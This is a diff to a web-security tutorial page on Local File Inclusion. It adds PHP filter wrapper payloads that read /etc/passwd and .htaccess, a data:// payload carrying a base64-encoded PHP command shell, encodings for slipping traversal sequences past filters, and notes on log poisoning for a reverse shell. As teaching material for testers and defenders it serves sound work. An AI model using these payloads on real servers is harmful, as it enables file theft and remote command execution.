@@ -11,6 +11,8 @@ The most common place we usually find LFI within is templating engines. In order
 
 <figure><img src="../../../../../../../.gitbook/assets/45d9c1baacda290c1f95858e27f740c9.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../../../../../../.gitbook/assets/51fca7adb2f8deb2d2bd3a83dc4d0c00.png" alt="" width="563"><figcaption></figcaption></figure>
+
 **We add  `../../../`   depending on how deep we are.**
 
 **Example Vulnerable URL:**
@@ -125,3 +127,64 @@ As a developer, it's important to be aware of web application vulnerabilities, h
 5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
 6. Never trust user input, and make sure to implement proper input validation against file inclusion.
 7. Implement whitelisting for file names and locations as well as blacklisting.
+
+## **PHP Wrappers**
+
+```
+php://filter/convert.base64-encode/resource=/etc/passwd
+```
+
+**PHP filter wrapper allows them to read files even when direct reading is restricted or broken**, and it helps **bypass output sanitization**.
+
+| Payload                                                                           | Output                                                  |
+| --------------------------------------------------------------------------------- | ------------------------------------------------------- |
+| <p>php://filter/convert.base64-encode/resource=<strong>.htaccess</strong><br></p> | <p>UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz<br></p> |
+| <p>php://filter/string.rot13/resource=<strong>.htaccess</strong><br></p>          | <p>ErjevgrRatvar ba Bcgvbaf -Vaqrkrf<br></p>            |
+| <p>php://filter/string.toupper/resource=<strong>.htaccess</strong><br></p>        | <p>REWRITEENGINE ON OPTIONS -INDEXES<br></p>            |
+| <p>php://filter/string.tolower/resource=<strong>.htaccess</strong><br></p>        | <p>rewriteengine on options -indexes<br></p>            |
+| <p>php://filter/string.strip_tags/resource=<strong>.htaccess</strong><br></p>     | RewriteEngine on Options -Indexes                       |
+
+### **Data Wrapper**
+
+The `data://` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.
+
+```
+data:text/plain,<?php%20phpinfo();%20?> , data:text/plain,<?php phpinfo(); ?>
+```
+
+A `data:` URI is **not a file** and **not a PHP script**.\
+It’s just a way to embed data directly inside a URL.
+
+The breakdown of the payload `data:text/plain,<?php phpinfo(); ?>` is:
+
+* `data:` as the URL.
+* `mime-type` is set as `text/plain`.
+* The data part includes a PHP code snippet: `<?php phpinfo(); ?>`.
+
+```
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls
+```
+
+## **Obfuscation**
+
+Obfuscation techniques are often used to bypass basic security filters that web applications might have in place. These filters typically look for obvious directory traversal sequences like `../`. However, attackers can often evade detection by obfuscating these sequences and still navigate through the server's filesystem.
+
+Encoding transforms characters into a different format. In LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance, `../` can be encoded or obfuscated in several ways to bypass simple filters.
+
+* Standard URL Encoding: `../` becomes `%2e%2e%2f`
+* Double Encoding: Useful if the application decodes inputs twice. `../` becomes `%252e%252e%252f`
+* Obfuscation: Attackers can use payloads like `....//`, which help in avoiding detection by simple string matching or filtering mechanisms. This obfuscation technique is intended to conceal directory traversal attempts, making them less apparent to basic security filters.
+
+## Log Poisoning
+
+```
+somehow we pass the php code to the log and when we open the logs wih lfi again the code would be run and do a revshell
+```
+
+**Why Log Poisoning is stealthy**
+
+* Logs are **normally ignored** by security teams.
+* Malicious content blends with normal log entries.
+* The attack does **not require uploading a file**; it abuses something already on the server.
+
+{% embed url="https://www.youtube.com/watch?v=id7K0mec3-Q" %}
